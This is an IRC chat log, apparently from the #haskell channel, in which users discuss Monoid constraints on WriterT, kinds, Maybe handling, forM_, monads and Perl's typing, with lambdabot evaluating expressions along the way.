15:11:50 <Cale> Haskell-as-standardised has a *very* simple kind system.
15:11:53 <hpc> there's no reason the definition of liftWriter should care what 'w' is
15:11:54 <burbul> hpc, Cale: I can believe their are technical reasons!
15:12:00 <hpc> and indeed, you can write that most general function
15:12:10 <burbul> hpc: thanks for the example
15:12:23 <hpc> < hpc> more generally, it turns "what is the type of this" into a slightly non-local problem -- did you notice this?
15:12:40 <hpc> i think that qualifies as moral ;)
15:12:47 <Cale> burbul: The kind of WriterT is currently  * -> (* -> *) -> * -> *
15:12:57 <burbul> (Saizan: only just noticed your messages -- thanks)
15:13:13 <Cale> burbul: you'd need a way to refine * to just that set of types which are instances of a typeclass
15:13:22 <kallisti> burbul: it as nothing to do with the fact that Writer is typically used with Monoid, and using it without that constraint is mostly non-productive. It's because constraining it in the data declaration gives you absolutely nothing, and requires you to write more in your type signatures.
15:13:24 <Cale> (or perhaps, those types satisfying a set of constraints)
15:13:56 <kallisti> burbul: you should be asking "what do I get from requiring the Monoid constraint in the data declaration", not "why would you use Writer without a Monoid constraint?"
15:14:13 <burbul> kallisti: answer is, more helpful (and earlier) error messages
15:14:27 <hpc> is the maintainer of hayoo in here?
15:14:29 <burbul> THe thing I got in this case reminded me somewhat of the error messages you get when you misuse templates in C++
15:15:00 <burbul> It would have been nice to have a type error as soon as I wrote
15:15:03 <burbul> type DerivationM = MaybeT (WriterT DerivationEntry NumberingM)
15:15:12 <Cale> kallisti: I believe that burbul wants it to be possible to infer that Monoid w from the fact that x :: ReaderT w m a
15:15:39 <burbul> (Haskell is normally really good about reporting things early, which is why was surprised.)
15:15:43 * kallisti isn't sure that the drawbacks are worth the small benefits.
15:15:48 <zezikaro> Cale So that gives 'maybe State'
15:16:01 <zezikaro> so I need 'either first() State(halt)'
15:16:02 <zezikaro> ?
15:16:02 <hpc> Cale: once ConstraintKinds becomes a thing, i think you can?
15:16:14 <hpc> it would take an mtl update though
15:16:39 <Cale> zezikaro: case ... of Nothing -> error "Incomplete program"; Just newState -> ...
15:16:58 <Cale> hpc: Um, kinda, but not quite as strong as this.
15:17:31 <Cale> ConstraintKinds is badly named
15:17:39 <Cale> as it only adds one kind
15:17:43 <Cale> which is Constraint
15:18:00 <Cale> it doesn't add kinds for each type of constraint :)
15:18:02 <kallisti> burbul: any polymorphic code that works with a Wrtier /must/ have a Monoid constraint. there's no reason that should be the case.
15:18:10 <hpc> Cale: ah, right
15:18:11 <Cale> or each t :: Constraint
15:18:27 <burbul> Anyway, thanks again, guys. (I've been cutting and pasting everything you tell me into Gmail messages to myself, so I can find it all again!)
15:18:49 <hpc> Cale: DataKinds too, perhaps?
15:18:57 <kallisti> does anyone have strong opinions on the precedences of boolean operators?
15:19:03 <hpc> then you make a datatype that encodes the Monoid constraint, then use it as a kind
15:19:10 <kallisti> I can't decide what biconditionals, xor, and implication should be
15:19:17 <kallisti> relative to each other and && and ||.
15:19:18 <zezikaro> Cale Do I need an intermediatary state for that?
15:19:22 <burbul> kallisti: I think if you're using the Writer qua general Monad, you don't need to mention the constraint; and if you are using it by explicitly mentioning WriterT, then you should mention the constraint.
15:19:29 <burbul> Being forced to type things is good!
15:19:42 <hpc> (DataKinds is poorly named too)
15:19:47 <zezikaro> Cale By that I mean; http://ideone.com/P8U8x
15:19:51 <kallisti> burbul: you can't seperate all cases into those 2 categories
15:20:11 <burbul> It may just be that I don't have enough experience to grok that
15:21:04 <kallisti> Writer may not be an example that deonstrates the flaws of constraints in data declarations.
15:21:16 <burbul> It just feels like a higher-kinded analogue of not being able to specify the type of a function.
15:21:27 <burbul> ok
15:23:02 <hpaste> d-snp pasted “How do I factor out I/O?” at http://hpaste.org/69174
15:23:14 <d-snp> hey guys, I made this big function
15:23:37 <d-snp> and it does a lot of stuff, and also I/O, what would your plan be to make it less IO/y?
15:23:57 <kallisti> :t runWriter
15:23:57 <lambdabot> forall w a. Writer w a -> (a, w)
15:25:57 <kallisti> burbul: http://stackoverflow.com/a/2172085  this answer on SO might be helpful as well
15:26:38 <burbul> thanks!
15:26:42 <strager> d-snp: Looks like you can factor all those 'let's into one pure function
15:26:47 <kallisti> GHC won't infer the typeclass context from pattern matching, so typeclass constraints are still required by the calling code.
15:28:04 <barrucadu> d-snp: Maybe move out the Message construction code to something else pure , taking as parameters values for now, myVT, and myTSN
15:28:09 <burbul> That stack overflow article is really good.
15:29:15 <burbul> I think the main thing I would quibble with is "functions should generally be as polymorphic as possible, so why force the constraint onto things that don't need it?"
15:29:37 <burbul> It's definitely the case that want to get carried away with constraints -- for example there's no reason why List a should require Eq a...
15:29:50 <kallisti> or that Map should require Ord.
15:29:53 * hpc argues "functions have types that say what they do"
15:30:02 <kallisti> :t Data.Map.toList
15:30:03 <lambdabot> forall k a. M.Map k a -> [(k, a)]
15:30:07 <hpc> so if it helps to be specific, go for it
15:30:16 <burbul> This feels like an analogue of the static/dynamic argument in a higher octave.
15:30:17 <hpc> if it doesn't help to be specific, don't
15:30:40 <burbul> In that someone immersed in dynamic languages might say, why bother having types: if something is wrong you will be able to tell as soon as you run the program
15:30:58 <burbul> Here it feels that people are saying: why bother having kind constraints:  as soon as you write a function that utilises the type, you'll be able to tell that something is wrong.
15:31:02 <kallisti> burbul: the behavior you desire isn't necessarily wrong for others.
15:31:17 <burbul> You mean isn't necessarily right?
15:31:19 <kallisti> there's nothing requiring you to use WriterT as a Monad.
15:31:30 <hpc> @src WriterT
15:31:30 <lambdabot> Source not found. The more you drive -- the dumber you get.
15:31:31 <kallisti> er, yes.
15:32:15 <hpc> is there a hayoo maintainer in here?
15:32:25 <kallisti> burbul: the difference here is that you get the errors slightly later in development. specifically, when you have actually have some substantial code.
15:32:30 <kallisti> not "at runtime"
15:32:45 <burbul> yes, I didn't mean the analogy to be stretched too far...
15:33:04 <burbul> I just wanted to say there were both advantages and disadvantages.
15:33:32 <burbul> code in e.g. Python can often allow you more polymorphism than you envisaged when writing it -- but the cost is that the errors turn up 'later'.
15:33:39 <burbul> Obviously the difference between the 'times
15:33:41 <burbul> '
15:33:52 <burbul> is much smaller in the two Haskell cases than in Haskell versus Python
15:34:16 <kallisti> this is only really applicable to concrete code
15:34:23 <kallisti> concrete meaning monomorphic types.
15:34:37 <burbul> I don't know what monomorphic types means
15:35:02 <kallisti> if you ever write polymorphic functions on <insert type with explicit context in data declaration>, you'll quickly require explicit type signatures you didn't need otherwise.
15:35:12 <kallisti> burbul: monomorphic is "not polymorphic"
15:35:20 <kallisti> Char is a monomorphic type.
15:35:21 <burbul> ah
15:35:38 <burbul> Then I don't think I understood what you meant by 'this' in ' this is only really applicable ...'
15:35:47 <kallisti> your analogy with PYthon
15:35:55 <burbul> Well, no, I think I'm going to quibble with that:
15:36:08 <kallisti> it only makes sense if you're dealing with monomorphic types. because then the disadvantages aren't apparent
15:36:15 <burbul> It's possible to write something that you think is polymorphic but which *isn't polymorphic enough*
15:36:33 <kallisti> :t runWriterT
15:36:34 <lambdabot> forall w (m :: * -> *) a. WriterT w m a -> m (a, w)
15:36:37 <kallisti> make this more polymorphic.
15:36:45 <burbul> Because you have haven't captured a certain dimension of variation inside a type class
15:36:55 <burbul> In that case, I can't.
15:37:57 <hpaste> d-snp annotated “How do I factor out I/O?” with “How do I factor out I/O? (annotation)” at http://hpaste.org/69174#a69175
15:38:05 <kallisti> what's funny is that even if you made a typeclass for "WriterT-like monads that can be run to produce m (a, w)"
15:38:18 <kallisti> you still can't write an instance for WriterT, because your typeclass method still requires that Monoid instance
15:38:32 <d-snp> alright, it did result in some code duplication but I guess the I/O is now more clearly separated
15:38:45 <d-snp> is this how it should look?
15:38:49 <kallisti> your typeclass method itself would require the Monoid constraint.
15:44:19 <Cale> d-snp: It looks like your code should be possible to factor somewhat without any duplication... You might just pull out newHeader and initAck and those cookies as functions of the various things they depend on.
15:51:33 <d-snp> wtf.. 1 + 1 is of type Int, but 1 * 1 is Integer?
15:51:37 <d-snp> :t 1+1
15:51:37 <lambdabot> forall t. (Num t) => t
15:51:46 <d-snp> :t 1*1
15:51:46 <lambdabot> forall t. (Num t) => t
15:51:48 <d-snp> hm
15:52:09 <d-snp> [1+1, 1*1]
15:52:16 <d-snp> ah well whateve
15:52:18 <d-snp> r
15:52:33 <Bytter> guys, how to I convert a tuple into a list?
15:52:33 <d-snp> I don't know what I did wrong, I fixed it when I put :: Int after my * expression :S
15:53:00 <kallisti> d-snp: integer literals are overloaded on the Num typeclas. It defaults to Integer if the type is ambiguous
15:53:03 <d-snp> Bytter: for a tuple of unspecified size?
15:53:23 <kallisti> > [1+1, 1*1]
15:53:24 <lambdabot>   [2,1]
15:53:32 <Bytter> d-snp: yes... although I'm also curious for a tuple of fixed size, besides pattern matching
15:53:51 <kallisti> there's no sane way to do that.
15:53:55 <d-snp> kallisti: I guess some other context forced one of them into an Integer, and the other into an Int somehow
15:53:57 <kallisti> typically you don't want to
15:54:03 <kallisti> consider that tuples can contain elements of arbitrary types
15:54:07 <kallisti> whereas lists contain elements of the same type.
15:54:18 <Bytter> kallisti: true... consider that I know the type
15:54:51 <d-snp> consider that the type of a tuple is dependant on its size
15:54:57 <d-snp> whereas a list does not have that
15:55:25 <kallisti> with typeclass magic it may be possible to overload one function for this purpose
15:55:32 <d-snp> really?
15:55:37 <kallisti> sure
15:55:55 <d-snp> does tuple have an instance for some list like class?
15:56:05 <kallisti> at the end of the day, tuples and lists serve completely different purposes. You should have a pretty good reason for wanting to convert between them automatically
15:56:15 <kallisti> d-snp: no. you would have to create them
15:56:16 <siracusa> kallisti: Also for arbitrary tuple sizes?
15:56:51 <dmwit> Given that forall n. n-tuple => n < 63, yes, for arbitrary tuple sizes.
15:57:01 <d-snp> ..63? :D
15:57:18 <kallisti> class ToList l a where toList :: l -> [a]
15:57:28 <kallisti> instance ToList (a,a) a where ...
15:57:30 <kallisti> instance ToList (a,a,a) a where ...
15:57:32 <kallisti> etc
15:57:36 <kallisti> have fun.
15:57:42 <d-snp> :P
15:57:45 <applicative> > let untuple5 = \(h,e,l,l,o) -> [h,e,l,l,o] in untuple5 ('h','e','l','l','o')
15:57:46 <lambdabot>   Conflicting definitions for `l'
15:57:46 <lambdabot>  Bound at: <interactive>:1:21
15:57:46 <lambdabot>            <i...
15:57:49 * hackagebot cond 0.4 - Basic conditional and boolean operators with monadic variants.  http://hackage.haskell.org/package/cond-0.4 (AdamCurtis)
15:58:00 <tertl3> oh neat leksah is sweet nectar
15:58:00 <applicative> > let untuple5 = \(h,e,l,lx,o) -> [h,e,l,lx,o] in untuple5 ('h','e','l','l','o')
15:58:01 <lambdabot>   "hello"
15:58:23 <burbul> :t runStateT
15:58:24 <lambdabot> forall s (m :: * -> *) a. StateT s m a -> s -> m (a, s)
15:58:25 <tertl3> burbul :)
15:58:37 <burbul> It is fantastic, isn't it!
15:58:51 <mroman> Does acid-state only work in-memory?
15:58:55 <burbul> I could never go back to an editor without the type error highlighting.
15:59:23 <mroman> Meaning: Is all data always read and stored in memory?
16:02:37 <otters> hClose on a non-buffered handle appears to wait until something is written to the handle to actually close it
16:05:01 <tertl3> burbul I like it a lot,one quesiton though, what folder should I set as "Path under which haskell sources may be found"?
16:05:39 <d-snp> if I want to test something with I/O, do I also use Quick Check?
16:05:50 <tertl3> is that gonna be the AppData\Roaming\cabal dir?
16:06:07 <kallisti> something like that.
16:06:44 <kallisti> d-snp: there's Test.QuickCheck.Monadic which can be used for that purpose
16:07:30 <kallisti> quickcheck isn't required though, you could use hunit as well.
16:13:25 <kallisti> I don't understand why polymorphic variables to default to () in ghci
16:15:37 <sipa> do they? :o
16:16:34 <applicative> > mempty
16:16:35 <lambdabot>   ()
16:16:43 <Ralith> that's lambdabot.
16:17:04 <applicative> its in my ghci too
16:17:49 <applicative> but I have -XNoMonomorphism... set
16:20:00 <dmwit> Did you know that NoMR can be set separately in a file and in ghci?
16:20:11 <dmwit> (As with all other extensions.)
16:20:19 <Luke> anyone here know how postgresql-simple handles pg enum types?
16:20:45 <dmwit> ...not that that matters
16:21:17 <dmwit> It seems to be (extended) defaulting, not MR.
16:26:51 <zezikaro> Sorry, just wondering how I can get a 'maybe' into the actual thing please
16:27:05 <zezikaro> my Map.lookUp returns a maybe
16:27:13 <zezikaro> and my find () (map.LookUp)
16:27:17 <zezikaro> returns a maybe..
16:27:29 <zezikaro> is there a way to get it to the type I need?
16:27:50 <solarus> @src fromJust
16:27:51 <lambdabot> fromJust Nothing  = undefined
16:27:51 <lambdabot> fromJust (Just x) = x
16:27:53 <Twisol> pattern-match? Handle the Nothing case (i.e. it wasn't found) and the (Just x) case
16:28:31 <zezikaro> so I need two temp vars?
16:29:23 <Ralith> easiest way is to use the monad
16:29:39 <zezikaro> Twisol "Just x"
16:29:46 <zezikaro> can I then assign x as though it were actually x
16:29:48 <zezikaro> and not maybe x
16:29:51 <Ralith> the maybe monad is very simple
16:29:55 <zezikaro> Ralith Example please? >.<
16:29:57 <zezikaro> sorry
16:29:59 <jonaskoelker> > maybe "not found" show $ lookup "x" $ fromList [("x", 1), ("y", 2)]
16:30:00 <lambdabot>   Couldn't match expected type `([GHC.Types.Char], b)'
16:30:00 <lambdabot>         against inferr...
16:30:01 <Twisol> 'x' is the value contained inside the Maybe
16:30:12 <jonaskoelker> > maybe "not found" show $ Data.Map.lookup "x" $ fromList [("x", 1), ("y", 2)]
16:30:13 <lambdabot>   Not in scope: `Data.Map.lookup'
16:30:15 <Twisol> if you pattern match (Just x) and it succeeds, you know you have a value there (and it's bound to 'x')
16:30:18 <jonaskoelker> > maybe "not found" show $ Map.lookup "x" $ fromList [("x", 1), ("y", 2)]
16:30:19 <lambdabot>   Not in scope: `Map.lookup'
16:30:24 <Ralith> zezikaro: what are you trying to do with the value?
16:30:26 <jonaskoelker> > maybe "not found" show $ lookup [("x", 1), ("y", 2)]
16:30:27 <lambdabot>   Couldn't match expected type `Data.Maybe.Maybe a'
16:30:27 <lambdabot>         against inferred ...
16:30:28 <applicative> what do you want to happen if  its Nothing?
16:30:29 <jonaskoelker> -.-
16:30:35 <Ralith> @type fmap
16:30:36 <lambdabot> forall a b (f :: * -> *). (Functor f) => (a -> b) -> f a -> f b
16:30:44 <Ralith> replace f with Maybe
16:30:51 <Ralith> and then pass your function as the first argument and your value as the second
16:30:53 <zezikaro> 			newState = Just (find (\x -> readSymbol x == currentSymbol || readSymbol x == '_') (Just (Map.lookup currentState states)))
16:30:57 <zezikaro> ignoring the 'just'
16:31:11 <zezikaro> I have a pool of states in a map
16:31:24 <applicative> @type Map.lookup
16:31:24 <lambdabot> Couldn't find qualified module.
16:31:25 <zezikaro> then i need to go through them and find the one that matches my read simple, or the wildcard
16:31:44 <parcs`> kallisti: i'm guessing because some IO expressions that return a polymorphic value, eg 'forever' and 'throw', otherwise wouldn't type check within ghci due to an ambiguous type var error
16:32:49 <zezikaro> Ralith http://ideone.com/ohhbt
16:32:58 <zezikaro> line 56
16:33:01 <zezikaro> i want to get the new state
16:33:05 <zezikaro> and I don't mind if it crashes
16:34:07 <barrucadu> If you want to just turn a "Maybe a" into an "a", use fromJust. That *will* give a runtime error if it's Nothing rather than Just though
16:34:18 <parcs`> kallisti: dunno why the defaulting rules are not just performed on a Show constraint, though
16:34:20 <barrucadu> :t fromJust
16:34:20 <lambdabot> forall a. Maybe a -> a
16:34:31 <parcs`> extended defaulting*
16:34:47 <Ralith> zezikaro: tbh I'd rewrite the entire thing using some sort of state monad
16:34:59 <Ralith> probably not the best person to ask how to do that though
16:35:08 <zezikaro> Ralith I'm only stringing together what i know from learn you a haskell
16:35:12 <zezikaro> i haven't gotten that far >.<
16:35:53 <Ralith> monads are extremely useful; it'd be worth your while to progress that far, I think.
16:36:25 <zezikaro> is haskell useful?
16:36:55 <Twisol> as useful as any other language. It lends itself to a particular mode of thinking.
16:37:41 <Ralith> it's one of those languages for which learning it will tend to make you a better programmer regardless of language.
16:37:57 <jonaskoelker> I beg to differ, Twisol: it's much more useful than brainfuck :P
16:37:58 * hackagebot yall 0.2.0.1 - Lenses with a southern twang  http://hackage.haskell.org/package/yall-0.2.0.1 (BrandonSimmons)
16:38:13 <Twisol> jonaskoelker: at least as useful as any other language, then.
16:38:31 <jonaskoelker> (sorry)
16:38:34 <Twisol> ;)
16:38:45 <Ralith> Twisol: nonsense--plenty of platforms on which haskell is simply not an option!
16:38:57 <Twisol> bah, pedants
16:39:20 <Ralith> :D
16:39:41 <jonaskoelker> Ralith: which would those be?  The iPhone?  Bah, we just need a haskell->objc compiler
16:39:47 <Ralith> :P
16:40:02 <Ralith> easier to run on the iphone than a microcontroller, I expect.
16:40:50 <Twisol> I think the thing I like most about Haskell is its type system.
16:41:55 <Twisol> It's really different from any other language I've used.
16:42:14 <sipa> clearly you haven't used agda yet!
16:42:22 <jonaskoelker> ml?
16:42:46 <jonaskoelker> heck, even c++ (ew) and java (yuck) have some kind of parametric types
16:43:45 <Twisol> Never used Adga or ML
16:46:12 <Ralith> jonaskoelker: "parametric types" are not what make haskell's type system nice :P
16:46:38 <Ralith> Twisol: read up on ML a little sometime, it's more or less Haskell's immediate predecessor in type systems
16:47:39 <Twisol> Will do!
16:48:09 <rasfar> I've been getting "Warning: The documentation for the following packages are not installed. No
16:48:09 <rasfar> links will be generated to these packages: ffi-1.0, rts-1.0" for a long time. Would it be safe to run "cabal haddock" on these core libs?
16:49:56 <jonaskoelker> Ralith: it's the feature I'm missing the most when I work in more primitive type systems, e.g. C's
16:51:42 <Ralith> it's certainly useful, but as you observe, it's hardly novel
16:52:26 <jonaskoelker> what, according to you, is it that makes Haskell's type system nice?
16:52:26 <rasfar> my understanding is it's Very Bad to "cabal install --reinstall" these libs, but presumably it's safe to run "cabal haddock"?...
16:53:21 <Ralith> jonaskoelker: I dunno, maybe all the features that aren't trivially isomorphic to stuff in mainstream langs? :P
16:53:51 * monochrom used agda without the g. that's ada. :)
16:54:16 <Philippa> jonaskoelker: C++ does not have parametric types. You can tell, they don't have parametricity
16:54:36 <jonaskoelker> Philippa: huh?  vector<int>?
16:55:12 <Philippa> is allowed to be specialised on the fact it's vector<int> and not vector<bool>
16:55:28 <Philippa> that specialisation doesn't actually have to follow any rules at all
16:55:32 <Philippa> that's not parametricity
16:55:36 <jonaskoelker> ahh... quasiparametric types, then?
16:55:57 <jonaskoelker> higher order types?
16:56:00 <Philippa> strictly speaking I'm punning on two different technical meanings of 'parametric' here :-)
16:56:00 <kallisti> I believe there's a difference between what is meant by "parametric types" and "parametricity"
16:56:09 <Ralith> higher-order types are a different thing
16:56:11 <Philippa> kallisti: yep. There shouldn't be, though
16:56:23 <jonaskoelker> huh, what are thos?  (HOTs)
16:56:28 <Philippa> (historical accident)
16:56:41 <Ralith> jonaskoelker: types with kind other than *, I believe.
16:56:44 <kallisti> Philippa: well, when haskell takes over the world, we can subjugate everyone else to our non-standard nomenclature. :P{
16:57:02 <jonaskoelker> Ralith: ah, template classes :)
16:57:05 <Philippa> kallisti: it's not non-standard. It's a /different/ standard, that isn't strictly Haskell's
16:57:06 <Ralith> ...?
16:57:16 <Philippa> (and C++ still doesn't have parametric types because templates /aren't types/)
16:57:19 <jonaskoelker> vector :: * -> *
16:57:36 <Philippa> (it just has a hack that's close enough to butcher on through. Which is suitably C++ish)
16:57:59 * hackagebot zippo 0.1 - A simple lens-based, generic, heterogenous, type-checked zipper library  http://hackage.haskell.org/package/zippo-0.1 (BrandonSimmons)
16:58:01 <jonaskoelker> That's a fair point.  C++ has types-related-by-type-arguments :-)
16:58:36 <jonaskoelker> so C : C++ :: shell scripts : perl ?
16:58:47 <Philippa> nope. Perl makes more sense
16:58:53 <Siod> i'm not so sure C++ template args aren't types
16:58:53 <jonaskoelker> :D
16:58:53 <lambdabot> Siod: You have 1 new message. '/msg lambdabot @messages' to read it.
16:59:00 <Ralith> isn't perl weakly typed?
16:59:11 <jonaskoelker> I think it's quantum typed
16:59:20 <kallisti> Ralith: as mauke points out, it depends on how you define what perl's type are.
16:59:24 <jonaskoelker> whether "1" is an integer or list depends on how you observe it
16:59:33 <jonaskoelker> oops, string
16:59:33 <Ralith> sounds weakly typed to me.
16:59:44 <kallisti> list as well
17:00:01 <kallisti> my @x = 1;
17:00:08 <jonaskoelker> that makes me a sad panda
17:00:22 <zezikaro> haskell is so complicated D:
17:00:28 <kallisti> the list vs. scalar context is actually one of the best features of Perl.
17:00:36 <zezikaro> Does anyone know how to do something like this in js/php
17:01:13 <monochrom> haskell weekly news is weekly typed
17:01:21 <jonaskoelker> hur hur hur :D
17:01:30 <zezikaro> foreach(key in map) foreach(val in map[key]) print key ++ "->" ++ val
17:02:03 <Ralith> zezikaro: haskell is very simple; it's just that all those other languages go to great lengths to hide their complexity! :D
17:02:18 <Philippa> jonaskoelker: FWIW, parametricity is actually important because it means we can assume things about values (inc. functions) with parametric types
17:02:27 <kallisti> forM (fromList map) $ \(k, v) -> print $ show k ++ "->" ++ show v
17:02:38 <shachaf> "weakly typed" is a meaningless term.
17:02:43 <Philippa> for example, forall a. a -- not worth evaluating
17:02:46 <kallisti> actually use forM_ instead
17:03:14 <kallisti> zezikaro: ^
17:03:38 <jonaskoelker> shachaf: so in perl, there's no string/int types but rather a scalar type with some partially defined operations?
17:03:49 <kallisti> the builtins are fully defined.
17:04:03 <shachaf> jonaskoelker: I have no idea what the specifics of what Perl does are.
17:04:07 <kallisti> but even then there's implicit coercion between scalars and lists
17:04:27 <shachaf> Implicit coercion isn't a property of a language, it's a property of an operator.
17:04:36 <jonaskoelker> oh, so > and gt (orwhatevertheheck) both work for "1" and 1?
17:04:41 <kallisti> the way it distinguishes between numeric and string is through different operations. so eq is string equality, == is numeric equality. both operations are defined for "strings" and "numbers".
17:04:46 <kallisti> yes
17:05:14 <jonaskoelker> so "01" == "1" but "01" ne "1" (or vice versa)?
17:05:17 <kallisti> and they impose a scalar context, so any list value is coerced into a scalar value.
17:05:28 <jonaskoelker> first?  length?
17:05:29 <kallisti> believe so
17:05:37 <kallisti> depends. :)
17:05:45 <monochrom> usually length iirc
17:05:48 <jonaskoelker> on what, date of easter current year?
17:05:49 <kallisti> for an array it's length
17:05:51 <jonaskoelker> ;-)
17:05:55 <kallisti> for the expression (1,2,3,4)  it's 4
17:06:01 <zezikaro> How are you supposed to find out what forM_ does kallisti ?
17:06:01 <kallisti> because , in scalar context is like C's , operator
17:06:07 <kallisti> zezikaro: by its type
17:06:08 <jonaskoelker> @src forM_
17:06:09 <lambdabot> forM_ = flip mapM_
17:06:10 <zezikaro> it's very hard to find concise examples with haskell
17:06:10 <kallisti> and by learning about monads.
17:06:12 <monochrom> my uncertainty is evidence that the language is complicated
17:06:27 <Ralith> @type forM_
17:06:28 <lambdabot> forall a (m :: * -> *) b. (Monad m) => [a] -> (a -> m b) -> m ()
17:06:35 <zezikaro> it takes a star
17:06:36 <zezikaro> naice
17:06:52 <Ralith> no, it takes a monad
17:06:54 <Ralith> ic value
17:07:01 <Ralith> rather, a function returning one
17:07:11 <kallisti> essentially each operation is free to react arbitrarily to the knowledge that it's in scalar or list context.
17:07:41 <dobblego> @remember monochrom my uncertainty is evidence that the language is complicated
17:07:41 <lambdabot> I will remember.
17:07:44 <jonaskoelker> I think LW has said that perl does what you expect, unless you expect consistency
17:08:13 <jonaskoelker> which is like saying that you can predict what perl code does, unless you try to ^_^
17:08:19 <kallisti> or unless you know perl. ;)
17:08:37 <solidus-river> hey guys, i'm reading up on FRP from the reactive-banana standpoint and I have one big question after going through the intro
17:08:53 <zezikaro> banana?
17:08:59 <zezikaro> reactive banana..
17:09:07 <jonaskoelker> chemically infused =)
17:09:16 <startling> hmmm, are there file descriptor types that I can pass around?
17:09:24 <kallisti> there are file handles
17:09:29 <kallisti> :t openFile
17:09:29 <lambdabot> Not in scope: `openFile'
17:09:31 <kallisti> er
17:09:33 <solidus-river> how do it compile the network description in such a way that a change in the event stream always calls all related functions as well as functions related to those
17:09:37 <startling> that seems like what I'm looking for. thanks!
17:09:48 <jonaskoelker> zezikaro: I would not know anywhere near "for sure", but I'd guess that reactive-banana is a reference to a paper about functional programming with bananas, lenses and two other items
17:09:54 <solidus-river> does it somehow analyze whats in the network description to add callers to callers that are spawned from the event being called
17:09:55 <kallisti> :t System.IO.openFile
17:09:56 <lambdabot> FilePath -> GHC.IO.IOMode.IOMode -> IO GHC.IO.Handle.Types.Handle
17:09:59 <startling> how do i get the file handle for stdout?
17:10:02 <solidus-river> and if so what constructs in haskell allow such pattern matching
17:10:09 <kallisti> @src forM
17:10:09 <lambdabot> forM = flip mapM
17:10:13 <kallisti> @src mapM
17:10:13 <lambdabot> mapM f as = sequence (map f as)
17:10:13 <jonaskoelker> startling: import System.IO and say `stdout', IIRC
17:10:17 <kallisti> zezikaro: ^
17:10:21 <jonaskoelker> @hoogle stdout
17:10:21 <lambdabot> System.IO stdout :: Handle
17:10:21 <lambdabot> GHC.IO.Handle.FD stdout :: Handle
17:10:23 <kallisti> source code is helpful
17:10:25 <startling> jonaskoelker: oh nice, thanks
17:10:27 <kallisti> at figuring out what something does
17:11:00 <kallisti> Control.Monad is something you should familiarize yourself with, if you're working with Monads.
17:11:06 <solidus-river> i could see how via a compile step you could place everything in a network into functions that would call their relevant functions from them
17:11:13 <solidus-river> but i cant think of a way to systematically do that
17:11:36 <jonaskoelker> is there some way to make hoogle output all compositions of two functions which match an input type?
17:11:55 <jonaskoelker> or is that more a job for djinn?
17:11:56 <startling> wait, so how do I write to a handle?
17:12:05 <kallisti> :t hPutStr
17:12:06 <lambdabot> Not in scope: `hPutStr'
17:12:08 <kallisti> bah
17:12:10 <solidus-river> anyone know a good description of reactive-banana's techniques for this? or any such techniques? Or does anyone know what construct in haskell allows for.. given a series of monads, finding out what monades rely on which then modifying those monads?
17:12:21 <kallisti> startling: it's the same familiy of functions that you use to write to stdout, but with an h at the beginning of the name.
17:12:29 <startling> kallisti, ah, that makes sense
17:12:30 <kallisti> startling: it's all documented in the Prelude I believe.
17:12:35 <startling> I was looking for hWrite or something
17:13:18 <solidus-river> oh wait, i think that just gave me the insight into how it is done, but then what puprose does actuating the network do? add it to a global network?
17:14:49 <solidus-river> or perhaps actuate network sets up the handlers to empty lists? hmm talking aloud in irc probably a bad call
17:16:53 * kallisti thinks it would be fun to implement a perl-like Prelude in Haskell
17:17:11 * qtplatypus attempted it once.
17:18:08 <kallisti> how'd that go?
17:18:25 <Luke> I'm trying to use postgresql-simple but I cant figure out how to make convertable types: No instance for (QueryParams (In (t0, t1, t2, t3, t4, t5, t6))) arising from a use of `execute'
17:18:34 <Luke> this is a tuple of strings and ints
17:18:37 <qtplatypus> It was an interesting project.
17:18:54 <solidus-river> where can i find the source for the forever monad?
17:19:09 <solidus-river> i need to learn how to use hoogle
17:19:43 <mauke> what's the forever monad?
17:19:55 <qtplatypus> http://www.haskell.org/ghc/docs/latest/html/libraries/base/src/Control-Monad.html#forever
17:20:02 <mauke> that's a function, not a monad
17:20:13 <solidus-river> mistake
17:20:18 <qtplatypus> solidus-river: Is that what your looking for?  Its a function.
17:20:33 <solidus-river> qtplatypus: yeah, reading source to try to find out more
17:20:41 <solidus-river> qtplatypus: thanks for the link :)
17:20:41 <shachaf> mauke: data Forever a = Forever a (Forever a); it's another name for Stream.
17:20:56 <qtplatypus> @src forever
17:20:57 <lambdabot> Source not found. Just try something else.
17:21:41 <rasfar> Is it safe to run "cabal haddock" on core libs (ffi, rts)? My understanding is it's Very Bad to "cabal install --reinstall" these libs, but presumably it's safe to run "cabal haddock"?
17:21:43 <kallisti> forever m = m >> forever m
17:21:44 <solidus-river> so it just calls the monad passed to it forever
17:21:58 <kallisti> you don't "call" monads, per se.
17:22:02 <jonaskoelker> solidus-river: @hoogle someType -> someOtherType -> someTypeClass ofSomeType -- find all functions matching that signature
17:22:11 <mauke> solidus-river: that's not a monad
17:22:15 <mauke> solidus-river: a monad is a type
17:22:51 <zezikaro> kallisti Sorry, I just can't get the forM_ to work >.<
17:22:55 <solidus-river> wait, why is it wrong to think of forever asking for the value of an instance of a monad forever
17:23:05 <parcs`> what
17:23:08 <parcs`> everything
17:23:25 <solidus-river> :?
17:23:31 <zezikaro>  forM_ (Map.fromList possibleStates) $ \(k, v) -> print $ show k ++ "->" ++ show v)
17:23:37 <mauke> because the value of m is m
17:23:43 <mauke> and forever ignores the result of executing m
17:24:06 <zezikaro> coudln't match expected type [a0]
17:24:08 <solidus-river> but it does execute m
17:24:13 <kallisti> zezikaro: should be toList
17:24:18 <zezikaro> with actual type Map.Map k0 a1
17:24:35 <rasfar> Also, for me --disable-library-vanilla is not preventing the non-profiling versions from building
17:24:41 <zezikaro> oh
17:24:44 <zezikaro> thanks
17:24:49 <solidus-river> so if you ask to see the result of forever it will continually "execute" m a
17:25:13 <mauke> yes, if by "ask" you mean execute
17:25:17 <kallisti> you don't have to ask for the result of the forever either
17:25:22 <mauke> and there is no 'a'
17:26:01 <solidus-river> so
17:26:05 <kallisti> >> does not do anything with the results of monads.
17:26:47 <kallisti> it executes them in sequence.  there's nothing stopping you from doing  forever m1 >> m2
17:27:05 <solidus-river> for a >>= g
17:27:15 <solidus-river> does g have to produce the same monadic context as a is?
17:27:24 <mauke> yes
17:27:24 <kallisti> it needs to be the same monad
17:27:26 <kallisti> if that's what you mean
17:27:30 <mauke> see the type of >>=
17:27:33 <solidus-river> > :t (>>=)
17:27:34 <lambdabot>   <no location info>: parse error on input `:'
17:27:51 <kallisti> :t (>>=)
17:27:51 <lambdabot> forall (m :: * -> *) a b. (Monad m) => m a -> (a -> m b) -> m b
17:28:41 <solidus-river> kk cool
17:32:42 <solidus-river> is timer an io action thats dependent on the system clock or similar?
17:33:13 <kallisti> which timer
17:34:00 <kallisti> @hoogle timer
